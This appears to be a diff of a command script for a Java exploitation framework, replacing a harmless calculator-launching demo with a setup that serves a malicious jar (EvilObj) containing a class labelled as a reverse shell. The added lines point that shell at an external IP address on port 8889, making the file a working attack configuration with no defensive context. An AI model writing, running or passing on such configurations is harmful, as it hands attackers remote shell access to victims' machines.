@@ -1,16 +1,11 @@
-use exploit LDAPRefListener
-set lport 8888
-set codebase http://localhost:8081/
-set objectName EvilObj
-run
-
 use exploit SimpleHTTPServer
 use payload EvilFileWrapper
-use bullet ClassWithEvilConstructor
-set lport 8081
-set path /EvilObj.class
-set classname EvilObj
-set body "open -a Calculator"
-set type class
-run
+use bullet ClassWithReverseShell
+set lport 1088
+set path /EvilObj.jar
 
+set type jar
+set classname EvilObj
+set rhost 129.211.89.169
+set rport 8889
+run
